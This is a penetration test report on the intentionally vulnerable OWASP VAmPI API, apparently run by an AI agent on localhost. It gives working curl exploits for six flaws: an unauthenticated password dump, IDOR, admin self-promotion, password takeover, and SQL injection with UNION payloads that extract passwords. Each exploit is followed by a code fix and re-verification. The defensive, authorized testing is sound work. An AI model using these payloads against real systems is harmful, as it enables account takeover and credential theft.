# VAmPI — Penetration Test Report (independent target)

**Target:** `http://127.0.0.1:5000` — [OWASP VAmPI](https://github.com/erev0s/VAmPI),
"The Vulnerable API," a third-party intentionally-vulnerable Flask API modeled on
the OWASP API Security Top 10. Run locally, authorized, non-destructive.
**Date:** 2026-09-15
**Method:** black-box probing of the running API with `curl`; source read only to
confirm root cause. Every finding is proven with a live request/response, then
closed and re-verified against the exact same request.

Why this target: LedgerLite (the other example) is our own demo, so it only
proves the *loop* works. VAmPI is a **well-known app we didn't write** — the
`/hack-me` agent was pointed at it with nothing but the base URL and the normal
`GET /createdb` seed step, and told nothing about its bugs.

Seed accounts created by `GET /createdb`: `name1/pass1`, `name2/pass2`,
`admin/pass1`. Throwaway accounts (`atk_*`, `vic_*`, `esc_*`) were registered by
the test itself; no real data was destroyed.

**Result: 6 vulnerabilities proven; all closed and re-verified.**

VAmPI ships a global `vulnerable=1|0` switch. Part of the value here is showing
that flipping it to "secure" closes **four** of the six, but **not** the debug
credential dump — that one needed a real code fix. A single "secure mode" flag is
not the same as being secure.

---

## Finding 1 — Unauthenticated credential dump (`GET /users/v1/_debug`)

- **Class:** Excessive data exposure / broken function-level auth — OWASP API3/API5
- **Severity:** Critical
- **Endpoint:** `GET /users/v1/_debug`

Anyone — no token at all — can dump every user with their **plaintext password**.

### Exploit
```
$ curl -s http://127.0.0.1:5000/users/v1/_debug
{"users": [
  {"admin": false, "email": "mail1@mail.com", "password": "pass1", "username": "name1"},
  {"admin": false, "email": "mail2@mail.com", "password": "pass2", "username": "name2"},
  {"admin": true,  "email": "admin@mail.com", "password": "pass1", "username": "admin"}
]}                                                                          # HTTP 200
```

### Root cause & fix
The `debug()` view calls `get_all_users_debug()` with **no auth check**, and
VAmPI's global `vuln` switch does not gate it — so even "secure mode" leaks it.
Require an authenticated admin:

```python
def debug():
    resp = token_validator(request.headers.get('Authorization'))
    if "error" in resp:
        return Response(error_message_helper(resp), 401, mimetype="application/json")
    user = User.query.filter_by(username=resp['sub']).first()
    if not user or not user.admin:
        return Response(error_message_helper("Admin only"), 403, mimetype="application/json")
    return jsonify({'users': User.get_all_users_debug()})
```

### Re-verify
```
$ curl -s -w ' -> %{http_code}\n' http://127.0.0.1:5000/users/v1/_debug
{ "status": "fail", "message": "Invalid token. Please log in again."} -> 401

# a real admin token still works:
$ curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer <admin>" http://127.0.0.1:5000/users/v1/_debug
200
```

---

## Finding 2 — BOLA: read any user's private book secret (`GET /books/v1/{title}`)

- **Class:** Broken Object-Level Authorization (IDOR) — OWASP API1
- **Severity:** High
- **Endpoint:** `GET /books/v1/{book_title}`

Each book has a "secret" only its owner should read. The lookup is by title with
no owner check, so any authenticated user reads anyone's secret.

### Exploit
Victim posts a private book; attacker (a different account) reads its secret:
```
$ curl -s -X POST http://127.0.0.1:5000/books/v1 -H "Authorization: Bearer <victim>" \
       -H 'Content-Type: application/json' -d '{"book_title":"vic_secret_book","secret":"VICTIM-CONFIDENTIAL-42"}'
{"message": "Book has been added.", "status": "success"}

$ curl -s -X GET http://127.0.0.1:5000/books/v1/vic_secret_book -H "Authorization: Bearer <attacker>"
{"book_title": "vic_secret_book", "owner": "vic_poc", "secret": "VICTIM-CONFIDENTIAL-42"}   # HTTP 200
```

### Root cause & fix
`get_by_title()` does `Book.query.filter_by(book_title=title)` — no owner scope.
Scope the query to the caller (VAmPI's `vulnerable=0` branch does exactly this):
```python
user = User.query.filter_by(username=resp['sub']).first()
book = Book.query.filter_by(user=user, book_title=str(book_title)).first()
```

### Re-verify
```
$ curl -s -w ' -> %{http_code}\n' -X GET http://127.0.0.1:5000/books/v1/vic2_book -H "Authorization: Bearer <attacker>"
{ "status": "fail", "message": "Book not found!"} -> 404
# owner still reads their own book -> 200 with the secret.
```

---

## Finding 3 — Mass assignment: self-promote to admin at registration

- **Class:** Mass assignment — OWASP API6
- **Severity:** High
- **Endpoint:** `POST /users/v1/register`

The registration body is trusted to set the `admin` flag.

### Exploit
```
$ curl -s -X POST http://127.0.0.1:5000/users/v1/register -H 'Content-Type: application/json' \
       -d '{"username":"esc_poc","password":"Pw!12345","email":"esc_poc@example.com","admin":true}'
{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}

# confirmed via the debug dump — esc_poc is admin:
{"admin": true, "email": "esc_poc@example.com", "password": "Pw!12345", "username": "esc_poc"}
```

### Root cause & fix
`register_user()` reads `admin` straight from the request when `vuln` is on.
Never let the body set privilege — ignore the field (VAmPI's `vulnerable=0`
branch drops it):
```python
user = User(username=request_data['username'],
            password=request_data['password'],
            email=request_data['email'])   # admin defaults to False, not client-controlled
```

### Re-verify
```
# same request with admin:true, secure build:
$ curl -s -H "Authorization: Bearer <admin>" http://127.0.0.1:5000/users/v1/_debug | grep esc2
   esc2 admin = [False]
```

---

## Finding 4 — Account takeover: change another user's password

- **Class:** Broken Object-Level Authorization — OWASP API1
- **Severity:** Critical
- **Endpoint:** `PUT /users/v1/{username}/password`

The handler updates the password of the **path** username, not the caller, so any
authenticated user overwrites anyone's password.

### Exploit
```
$ curl -s -w '-> %{http_code}\n' -X PUT http://127.0.0.1:5000/users/v1/vic_poc/password \
       -H "Authorization: Bearer <attacker>" -H 'Content-Type: application/json' -d '{"password":"HACKED-by-atk"}'
-> 204

# victim's password is now attacker-controlled (debug dump):
{"admin": false, "email": "vic_poc@example.com", "password": "HACKED-by-atk", "username": "vic_poc"}
```

### Root cause & fix
It resolves the target as `filter_by(username=<path>)`. Bind the update to the
authenticated caller instead (the `vulnerable=0` branch does this):
```python
user = User.query.filter_by(username=resp['sub']).first()  # the caller, not the path
user.password = request_data.get('password')
```

### Re-verify
```
# attacker tries to change vic2's password on the secure build:
$ curl -s -X PUT http://127.0.0.1:5000/users/v1/vic2/password -H "Authorization: Bearer <attacker>" \
       -H 'Content-Type: application/json' -d '{"password":"HACKED2"}'
# the change now applies to the attacker's OWN account; the victim is untouched:
$ curl -s -X POST http://127.0.0.1:5000/users/v1/login -d '{"username":"vic2","password":"Pw!12345"}'
... "auth_token": "..."   # HTTP 200 — victim still logs in with the ORIGINAL password
```

---

## Finding 5 — SQL injection (`GET /users/v1/{username}`)

- **Class:** SQL Injection — OWASP API8 / injection
- **Severity:** Critical
- **Endpoint:** `GET /users/v1/{username}`

`get_user()` builds `f"SELECT * FROM users WHERE username = '{username}'"` — the
path segment is concatenated straight into SQL.

### Exploit
Boolean bypass — a username that doesn't exist returns a real user:
```
$ curl -s -w ' -> %{http_code}\n' "http://127.0.0.1:5000/users/v1/zzz'%20OR%20'1'='1"
{"username": "name1", "email": "mail1@mail.com"} -> 200
```
UNION exfiltration — dump the admin's password through the response (`col2` is
echoed as `username`, `col4` as `email`):
```
$ curl -s "http://127.0.0.1:5000/users/v1/zzz'%20UNION%20SELECT%201,password,3,username,5%20FROM%20users%20WHERE%20username='admin'--%20"
{"username": "pass1", "email": "admin"}          # admin's password is "pass1"
```

### Root cause & fix
Never build SQL by string interpolation. Use the ORM / a bound parameter (the
`vulnerable=0` branch uses `User.query.filter_by(username=username)`):
```python
fin_query = User.query.filter_by(username=username).first()
```

### Re-verify
```
$ curl -s -w ' -> %{http_code}\n' "http://127.0.0.1:5000/users/v1/zzz'%20OR%20'1'='1"
{ "status": "fail", "message": "User not found"} -> 404
$ curl -s -w ' -> %{http_code}\n' "http://127.0.0.1:5000/users/v1/zzz'%20UNION%20SELECT%201,password,3,username,5%20FROM%20users%20WHERE%20username='admin'--%20"
{ "status": "fail", "message": "User not found"} -> 404
# legit lookup still works:
$ curl -s "http://127.0.0.1:5000/users/v1/name1"
{"username": "name1", "email": "mail1@mail.com"}    # HTTP 200
```

---

## Finding 6 — Debug interpreter & stack traces exposed

- **Class:** Security misconfiguration / verbose errors — OWASP API7 / A05
- **Severity:** High
- **Endpoint:** app-wide (Flask `debug=True`)

The SQLi probes returned full SQLAlchemy stack traces and the **interactive
Werkzeug debugger** (`?__debugger__=yes`), which leaks the schema and, with the
console PIN, can lead to RCE.

### Root cause & fix
`vuln_app.run(..., debug=True)`. Never run a reachable app with the debugger on.
Run with `debug=False` (and a real WSGI server in production).

### Re-verify
Restarted with `debug=False`; errors now return a clean JSON `fail` body and no
debugger/traceback is served.

---

## Summary

| # | Finding | Class (OWASP API) | Severity | Closed by | Status |
|---|---------|-------------------|----------|-----------|--------|
| 1 | Unauth `/users/v1/_debug` password dump | Excessive data exposure (API3/API5) | Critical | **code patch** | Fixed → 401/403 |
| 2 | Read any user's book secret | BOLA (API1) | High | secure-mode scope | Fixed → 404 |
| 3 | Register as admin | Mass assignment (API6) | High | secure-mode drop field | Fixed → admin=false |
| 4 | Change any user's password | BOLA (API1) | Critical | secure-mode caller-bind | Fixed → victim untouched |
| 5 | SQLi in user lookup | Injection (API8) | Critical | secure-mode ORM | Fixed → 404 |
| 6 | Debugger/stack traces exposed | Misconfig (API7) | High | `debug=False` | Fixed → clean errors |

All six were re-verified against the exact original requests after the fix, and
legitimate happy paths (login, own-book read, own-password change, valid user
lookup, admin debug) still return `200`/`204`.

### The lesson VAmPI teaches

Four of six closed just by flipping VAmPI's built-in `vulnerable=0` "secure
mode" — but the **critical** one (an open, unauthenticated password dump) stayed
wide open, because a single global flag doesn't cover the endpoints someone
forgot to wire into it. `/hack-me` didn't take the flag's word for it: it
replayed every exploit and only marked a finding closed when the original
request failed.

### Reproduce

```bash
git clone https://github.com/erev0s/VAmPI && cd VAmPI
pip install -r requirements.txt
vulnerable=1 python3 app.py           # vulnerable build on http://127.0.0.1:5000
curl -s http://127.0.0.1:5000/createdb   # seed the demo users
# then run /hack-me against http://127.0.0.1:5000 (see ../../commands/hack-me.md)
```
Same guardrails as always: your own / authorized target, localhost only,
non-destructive proofs.
